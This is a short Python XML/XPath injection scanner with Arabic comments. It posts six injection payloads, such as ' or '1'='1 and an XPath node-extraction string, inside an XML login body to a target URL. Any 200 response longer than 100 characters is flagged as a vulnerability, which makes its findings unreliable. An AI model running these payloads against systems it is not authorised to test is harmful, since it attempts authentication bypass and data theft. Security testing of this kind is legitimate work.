"""
XML/XPath Injection Scanner
يفحص ثغرات XML و XPath Injection
"""

import requests
from typing import List, Dict

class XMLInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "'] | //user/*[contains(*,'",
            "' or 1=1]",
            "admin' or '1'='1",
        ]
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص XML/XPath Injection: {self.target}")
        
        for payload in self.payloads:
            try:
                # إرسال كـ XML
                xml_data = f"<user><username>{payload}</username><password>test</password></user>"
                
                response = requests.post(
                    self.target,
                    data=xml_data,
                    headers={'Content-Type': 'application/xml'},
                    timeout=10
                )
                
                if self._check_xml_injection(response):
                    self.vulnerabilities.append({
                        'type': 'XML/XPath Injection',
                        'severity': 'high',
                        'url': self.target,
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    print(f"  [!] XML Injection وُجدت! Payload: {payload}")
                    return self.vulnerabilities
            except:
                pass
        
        return self.vulnerabilities
    
    def _check_xml_injection(self, response) -> bool:
        """فحص نجاح XML Injection"""
        return response.status_code == 200 and len(response.text) > 100
